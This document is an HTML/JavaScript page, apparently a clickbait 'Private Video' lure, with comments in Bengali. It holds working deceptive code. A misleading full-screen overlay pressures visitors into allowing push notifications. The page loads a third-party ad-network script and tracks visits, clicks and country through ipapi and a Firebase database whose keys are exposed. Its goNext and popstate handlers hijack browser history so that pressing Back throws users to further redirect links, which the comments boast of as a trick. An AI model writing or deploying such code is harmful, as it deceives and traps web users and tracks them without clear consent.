<!-- 🔔 OneSignal Push Notification (Real) -->
<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
<script>
  window.OneSignalDeferred = window.OneSignalDeferred || [];
  OneSignalDeferred.push(async function(OneSignal) {
    await OneSignal.init({
      appId: "6f662330-4346-4691-beab-6d623d5d922e", // 🔴 আপনার App ID বসান
      autoPrompt: true,
      autoResubscribe: true,
      promptOptions: {
        native: {
          enabled: true,
          autoPrompt: true,
          timeDelay: 1,
          pageViews: 1
        }
      },
      welcomeNotification: {
        disable: false,
        title: "✅ Subscribed Successfully!",
        message: "You will now receive new video alerts 🔥"
      }
    });
  });
</script>

<!-- ⚡ Full Screen Overlay (Allow না করলে দেখাবে) -->
<script>
setTimeout(() => {
  OneSignalDeferred.push(async function(OneSignal) {
    let subscribed = await OneSignal.User.PushSubscription.optedIn;
    
    if (!subscribed) {
      let overlay = document.createElement('div');
      overlay.id = 'fullscreen-overlay';
      overlay.innerHTML = `
        <div style="
          position: fixed; top: 0; left: 0;
          width: 100%; height: 100%;
          background: rgba(0,0,0,0.9);
          z-index: 99999;
          display: flex; flex-direction: column;
          align-items: center; justify-content: center;
          text-align: center; color: white;
          padding: 20px;
        ">
          <div style="font-size:80px; margin-bottom:20px;">🔔</div>
          <h2 style="font-size:32px; margin-bottom:15px; font-weight:bold;">
            🔥 Don't Miss Exclusive Content!
          </h2>
          <p style="margin-bottom:30px; color:#ccc; font-size:18px;">
            Click Allow to get new video notifications directly on your phone
          </p>
          <button onclick="document.getElementById('fullscreen-overlay').remove()" 
            style="
              padding:18px 50px; 
              background:linear-gradient(135deg, #E12C30, #ff4757); 
              color:white;
              font-size:22px; font-weight:bold;
              border:none; border-radius:50px;
              cursor:pointer; margin-bottom:15px;
              box-shadow:0 10px 30px rgba(225,44,48,0.5);
              animation:pulse 1.5s infinite;
            ">
            ✅ Allow & Watch Now
          </button>
          <small style="color:gray; cursor:pointer; font-size:16px;" 
            onclick="document.getElementById('fullscreen-overlay').remove();">
            ⏰ Later
          </small>
        </div>
      `;
      document.body.appendChild(overlay);
    }
  });
}, 2000);
</script>

<body>
<script src="https://pl28959656.profitablecpmratenetwork.com/4f/f2/29/4ff2297fe77a70226621bc69b5e71dcd.js"></script>
<div class="max-w-md w-full p-4 text-center">

<!-- ✅ Firebase v8 FIX -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyDak1DyVV6GKRnytPfFtXtrec_iurdFY30",
  authDomain: "khairul-video-play.firebaseapp.com",
  databaseURL: "https://khairul-video-play-default-rtdb.firebaseio.com",
  projectId: "khairul-video-play",
  storageBucket: "khairul-video-play.firebasestorage.app",
  messagingSenderId: "282569730084",
  appId: "1:282569730084:web:649b69eb9c73d865a850b1",
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let links = [];

// ✅ Visit Track
db.ref("visits").push({time:Date.now()});

// ✅ Online User
let onlineRef = db.ref("stats/online");
onlineRef.transaction(n => (n||0)+1);
window.addEventListener("beforeunload",()=>{
  onlineRef.transaction(n => (n||1)-1);
});

// ✅ Load Template
db.ref("global").once("value").then(gSnap=>{
 let g = gSnap.val() || {};
 let template = g.defaultTemplate || "t1";

 db.ref("templates/"+template+"/settings").once("value").then(snap=>{
  let d = snap.val() || {};

  title.innerText = g.title || d.title || "🔥 Private Video";
  thumb.src = g.thumbnail || d.thumbnail || "https://i.imgur.com/8Km9tLL.jpg";

  // ✅ Geo Fix + Fallback
  fetch("https://ipapi.co/json/")
  .then(r=>r.json())
  .then(geo=>{
    let c = geo.country || "BD";
    db.ref("stats/countries/"+c).transaction(n=>(n||0)+1);
    links = (d.geo && (d.geo[c] || d.geo["BD"])) || [];
  })
  .catch(()=>{
    links = (d.geo && d.geo["BD"]) || [];
  });

 });
});

// UI Flow
function startFlow(){
  loading.style.display="block";
  setTimeout(()=>unlock.style.display="block",1500);
}

// Pick Link
function pickLink(){
  if(!links || links.length===0){
    alert("No link set ❌");
    return null;
  }
  return links[Math.floor(Math.random()*links.length)];
}

// 🔴 Redirect & History Hijack (মাস্টার ট্রিক) 🔴
function goNext(){
  let link = pickLink();
  if(!link) return;

  // ফায়ারবেসে ক্লিক কাউন্ট হবে
  db.ref("clicks").push({time:Date.now()});

  // ১. ইউজার Continue তে ক্লিক করার পাওয়ার কাজে লাগিয়ে একসাথে ৩টি ফেক হিস্ট্রি সেভ করা হলো
  for (let i = 3; i >= 1; i--) {
      history.pushState({ adIndex: i }, "Step " + i, "?step=" + i);
  }

  // ২. এরপর ইউজারকে ১ম ডাইরেক্ট লিংকে পাঠানো হলো
  setTimeout(() => {
      window.location.href = link;
  }, 100);
}

// 🔴 ৩. ইউজার ব্যাক করে ফিরে আসলেই ব্রাউজারকে ফাঁকি দিয়ে অটোমেটিক আবার ডাইরেক্ট লিংকে ছুড়ে মারবে! 🔴
window.addEventListener('popstate', function(event) {
    if (event.state && event.state.adIndex) {
        let nextLink = pickLink(); // ডাটাবেস থেকে আবার নতুন লিংক নিবে
        if(nextLink) {
            window.location.replace(nextLink); // Replace ব্যবহার করা হলো যাতে ব্রাউজার ব্লক না করে
        }
    }
});
</script>
